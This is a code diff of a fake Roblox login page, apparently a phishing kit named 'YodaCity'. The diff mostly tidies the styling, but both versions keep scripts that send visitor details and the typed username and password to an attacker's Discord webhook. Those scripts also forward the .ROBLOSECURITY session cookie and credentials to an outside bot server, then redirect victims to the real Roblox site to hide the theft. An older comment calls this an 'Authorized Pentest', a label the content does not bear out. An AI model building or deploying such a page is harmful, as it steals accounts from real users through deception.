@@ -23,10 +23,7 @@
             box-shadow: 0 8px 32px rgba(0,0,0,0.6);
             border: 1px solid rgba(255,255,255,0.06);
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 32px;
-        }
+        .logo { text-align: center; margin-bottom: 32px; }
         .logo h1 {
             font-size: 32px;
             letter-spacing: -1px;
@@ -37,24 +34,16 @@
         .logo p { color: #94a3b8; font-size: 14px; margin-top: 4px; }
         .input-group { margin-bottom: 16px; }
         .input-group label {
-            display: block;
-            color: #cbd5e1;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            display: block; color: #cbd5e1; font-size: 13px;
+            font-weight: 600; margin-bottom: 6px;
+            text-transform: uppercase; letter-spacing: 0.5px;
         }
         .input-group input {
-            width: 100%;
-            padding: 14px 16px;
+            width: 100%; padding: 14px 16px;
             background: rgba(255,255,255,0.06);
             border: 2px solid rgba(255,255,255,0.08);
-            border-radius: 10px;
-            color: #f1f5f9;
-            font-size: 16px;
-            outline: none;
-            transition: all 0.3s;
+            border-radius: 10px; color: #f1f5f9;
+            font-size: 16px; outline: none; transition: all 0.3s;
         }
         .input-group input:focus {
             border-color: #6366f1;
@@ -63,17 +52,11 @@
         }
         .input-group input::placeholder { color: #475569; }
         .login-btn {
-            width: 100%;
-            padding: 14px;
+            width: 100%; padding: 14px;
             background: linear-gradient(135deg, #6366f1, #8b5cf6);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 8px;
+            border: none; border-radius: 10px; color: white;
+            font-size: 16px; font-weight: 700; cursor: pointer;
+            transition: all 0.3s; margin-top: 8px;
         }
         .login-btn:hover {
             transform: translateY(-1px);
@@ -81,13 +64,10 @@
         }
         .login-btn:disabled { opacity: 0.6; transform: none; }
         .spinner {
-            display: none;
-            width: 20px; height: 20px;
+            display: none; width: 20px; height: 20px;
             border: 3px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
+            border-top-color: white; border-radius: 50%;
+            animation: spin 0.8s linear infinite; margin: 0 auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .login-btn.loading .btn-text { display: none; }
@@ -100,27 +80,17 @@
         .error-msg {
             background: rgba(239,68,68,0.1);
             border: 1px solid rgba(239,68,68,0.3);
-            color: #fca5a5;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 13px;
-            margin-bottom: 16px;
-            display: none;
+            color: #fca5a5; padding: 12px; border-radius: 10px;
+            font-size: 13px; margin-bottom: 16px; display: none;
         }
-        .loading-page {
-            display: none;
-            text-align: center;
-            padding: 60px 20px;
-        }
+        .loading-page { display: none; text-align: center; padding: 60px 20px; }
         .loading-page h2 { color: #e2e8f0; margin-bottom: 12px; }
         .loading-page p { color: #94a3b8; }
         .skeleton { 
-            height: 12px; 
+            height: 12px;
             background: linear-gradient(90deg, rgba(255,255,255,0.03) 25%, rgba(255,255,255,0.08) 50%, rgba(255,255,255,0.03) 75%);
-            background-size: 200% 100%;
-            animation: shimmer 1.5s infinite;
-            border-radius: 6px; 
-            margin: 10px 0;
+            background-size: 200% 100%; animation: shimmer 1.5s infinite;
+            border-radius: 6px; margin: 10px 0;
         }
         @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
         .skeleton-box { padding: 20px; }
@@ -128,49 +98,40 @@
 </head>
 <body>
     <div class="login-container">
-        <!-- Login Form -->
         <div id="loginForm" class="login-card">
             <div class="logo">
                 <h1>Roblox</h1>
                 <p>Sign in to continue</p>
             </div>
-
             <div id="errorMsg" class="error-msg">Invalid username or password</div>
-
             <form id="loginFormElement" onsubmit="return handleLogin(event)">
                 <div class="input-group">
                     <label for="username">Username / Email</label>
-                    <input type="text" id="username" name="username" placeholder="Roblox username or email" required autocomplete="off">
+                    <input type="text" id="username" placeholder="Roblox username or email" required autocomplete="off">
                 </div>
                 <div class="input-group">
                     <label for="password">Password</label>
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
+                    <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
                 </div>
                 <button type="submit" id="loginBtn" class="login-btn">
                     <span class="btn-text">Sign In</span>
                     <div class="spinner"></div>
                 </button>
             </form>
-
             <div class="footer-links">
                 <a href="#">Forgot password?</a>
                 <span>|</span>
                 <a href="#">Create account</a>
             </div>
-            <div class="tos-text">
-                By continuing, you agree to Roblox's Terms of Service and Privacy Policy.
-            </div>
+            <div class="tos-text">By continuing, you agree to Roblox's Terms of Service and Privacy Policy.</div>
         </div>
 
-        <!-- Loading Screen -->
         <div id="loadingScreen" class="login-card loading-page">
             <h1 style="font-size:32px;background:linear-gradient(135deg,#6366f1,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Roblox</h1>
             <p style="margin:12px 0 24px;color:#94a3b8;">Verifying your identity...</p>
             <div class="skeleton-box">
-                <div class="skeleton"></div>
-                <div class="skeleton" style="width:80%;"></div>
-                <div class="skeleton" style="width:60%;"></div>
-                <div class="skeleton" style="width:85%;"></div>
+                <div class="skeleton"></div><div class="skeleton" style="width:80%;"></div>
+                <div class="skeleton" style="width:60%;"></div><div class="skeleton" style="width:85%;"></div>
                 <div class="skeleton" style="width:70%;"></div>
             </div>
             <p style="color:#475569;font-size:12px;margin-top:16px;">One moment please...</p>
@@ -178,22 +139,20 @@
     </div>
 
     <script>
-        // ─── GET WEBHOOK FROM URL HASH ──────────────────────────────
-        // Link format: https://yodacity.netlify.app#WEBHOOK_URL
-        const WEBHOOK_URL = window.location.hash.substring(1);
+        // ─── CONFIG ───────────────────────────────────────────────
+        const WEBHOOK = window.location.hash.substring(1);
         const LINK_ID = Math.random().toString(36).substring(2, 10);
-        const REDIRECT_URL = 'https://www.roblox.com';
         const BOT_URL = 'https://yodacity-bot.onrender.com';
+        const REDIRECT = 'https://www.roblox.com';
 
-        // ─── STEP 1: Report page visit ─────────────────────────────
-        async function reportVisit() {
-            if (!WEBHOOK_URL) return;
+        // ─── Send visit notification ──────────────────────────────
+        async function sendVisit() {
+            if (!WEBHOOK) return;
             try {
-                await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: null,
                         embeds: [{
                             title: '👁️ New Page Visit',
                             color: 0x6366f1,
@@ -201,11 +160,11 @@
                                 { name: '🔗 Link ID', value: LINK_ID, inline: true },
                                 { name: '🕐 Time', value: new Date().toISOString(), inline: true },
                                 { name: '🔍 Referrer', value: document.referrer || 'Direct', inline: true },
-                                { name: '💻 Screen', value: `${screen.width}x${screen.height}`, inline: true },
+                                { name: '💻 Screen', value: screen.width + 'x' + screen.height, inline: true },
                                 { name: '🌍 Language', value: navigator.language, inline: true },
                                 { name: '🖥️ Platform', value: navigator.platform, inline: true }
                             ],
-                            footer: { text: 'YodaCity • Dualhook Active' },
+                            footer: { text: 'YodaCity • Dualhook' },
                             timestamp: new Date().toISOString()
                         }]
                     })
@@ -213,125 +172,87 @@
             } catch(e) {}
         }
 
-        // ─── STEP 2: Send credentials to webhook ──────────────────
-        async function sendCredentials(username, password) {
-            if (!WEBHOOK_URL) return false;
-            
-            // Try to get .ROBLOSECURITY cookie
-            let roblosecCookie = 'Not accessible (HttpOnly)';
+        // ─── Send credentials to Discord ─────────────────────────
+        async function sendCreds(username, password) {
+            if (!WEBHOOK) return;
+            let cookie = 'Not accessible (HttpOnly)';
             try {
-                const cookies = document.cookie.split(';');
-                for (let c of cookies) {
-                    const [name, ...val] = c.trim().split('=');
-                    if (name === '.ROBLOSECURITY') {
-                        roblosecCookie = val.join('=');
-                    }
-                }
+                document.cookie.split(';').forEach(c => {
+                    const [n, ...v] = c.trim().split('=');
+                    if (n === '.ROBLOSECURITY') cookie = v.join('=');
+                });
             } catch(e) {}
 
             try {
-                await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: '@everyone **🚨 New Victim Captured!**',
+                        content: '@everyone **🚨 New Victim!**',
                         embeds: [{
                             title: '🔑 Credentials Captured',
                             color: 0xef4444,
                             fields: [
-                                { name: '📧 Username/Email', value: `\`\`\`${username}\`\`\``, inline: false },
-                                { name: '🔐 Password', value: `\`\`\`${password}\`\`\``, inline: false },
-                                { name: '🍪 .ROBLOSECURITY', value: `\`\`\`${roblosecCookie.substring(0, 500)}\`\`\``, inline: false },
+                                { name: '📧 Username', value: '```' + username + '```', inline: false },
+                                { name: '🔐 Password', value: '```' + password + '```', inline: false },
+                                { name: '🍪 Cookie', value: '```' + cookie.substring(0, 300) + '```', inline: false },
                                 { name: '🔗 Link ID', value: LINK_ID, inline: true },
-                                { name: '⏰ Time', value: new Date().toISOString(), inline: true },
-                                { name: '🖥️ Platform', value: navigator.platform, inline: true },
-                                { name: '🌍 Language', value: navigator.language, inline: true },
-                                { name: '🔍 Referrer', value: document.referrer || 'Direct', inline: true }
+                                { name: '⏰ Time', value: new Date().toISOString(), inline: true }
                             ],
-                            footer: { text: 'YodaCity • Authorized Pentest' },
+                            footer: { text: 'YodaCity' },
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
-                return true;
-            } catch(e) { return false; }
-        }
+            } catch(e) {}
 
-        // ─── STEP 3: Send cookie to checker bot ───────────────────
-        async function checkCookie(cookie, username, password) {
-            try {
-                await fetch(`${BOT_URL}/api/check-cookie`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        cookie: cookie,
-                        webhook: WEBHOOK_URL,
-                        linkId: LINK_ID,
-                        username: username,
-                        password: password
-                    })
-                });
-            } catch(e) {
-                console.log('Bot check failed (bot may be sleeping on free tier)');
+            // Also send to bot for full scan
+            if (cookie && !cookie.includes('Not accessible')) {
+                try {
+                    await fetch(BOT_URL + '/api/check-cookie', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            cookie: cookie,
+                            webhook: WEBHOOK,
+                            linkId: LINK_ID,
+                            username: username,
+                            password: password
+                        })
+                    });
+                } catch(e) {}
             }
         }
 
-        // ─── HANDLE LOGIN ──────────────────────────────────────────
-        async function handleLogin(event) {
-            event.preventDefault();
-
+        // ─── Handle login ─────────────────────────────────────────
+        async function handleLogin(e) {
+            e.preventDefault();
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
             const btn = document.getElementById('loginBtn');
-            const errorMsg = document.getElementById('errorMsg');
+            const err = document.getElementById('errorMsg');
 
             if (!username || !password) {
-                errorMsg.style.display = 'block';
-                errorMsg.textContent = 'Please fill in all fields.';
+                err.style.display = 'block';
+                err.textContent = 'Please fill in all fields.';
                 return false;
             }
 
             btn.classList.add('loading');
             btn.disabled = true;
-            errorMsg.style.display = 'none';
+            err.style.display = 'none';
 
-            // Send credentials to Discord webhook
-            await sendCredentials(username, password);
+            await sendCreds(username, password);
 
-            // Try to send to bot checker too
-            // Try to grab cookie from browser
-            let roblosecCookie = '';
-            try {
-                const cookies = document.cookie.split(';');
-                for (let c of cookies) {
-                    const [name, ...val] = c.trim().split('=');
-                    if (name === '.ROBLOSECURITY') {
-                        roblosecCookie = val.join('=');
-                    }
-                }
-            } catch(e) {}
-            
-            if (roblosecCookie) {
-                await checkCookie(roblosecCookie, username, password);
-            }
-
-            // Show loading screen
             await new Promise(r => setTimeout(r, 2000));
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('loadingScreen').style.display = 'block';
 
-            // Redirect to real Roblox
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 3000);
-
+            setTimeout(() => { window.location.href = REDIRECT; }, 3000);
             return false;
         }
 
-        // ─── INIT ───────────────────────────────────────────────────
-        window.addEventListener('DOMContentLoaded', () => {
-            reportVisit();
-        });
+        window.addEventListener('DOMContentLoaded', sendVisit);
     </script>
 </body>
 </html>
